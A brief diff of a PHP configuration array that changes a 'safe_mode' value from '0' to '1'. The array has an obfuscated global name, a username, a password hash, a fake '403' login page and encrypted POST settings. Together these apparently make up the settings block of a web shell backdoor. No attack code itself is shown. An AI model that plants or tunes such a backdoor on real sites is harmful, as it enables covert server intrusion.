@@ -9,7 +9,7 @@
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'saul',
     'password' => '61bf1611fbe77127822e0c247784641c',
-    'safe_mode' => '0',
+    'safe_mode' => '1',
     'login_page' => '403',
     'show_icons' => '1',
     'post_encryption' => true,
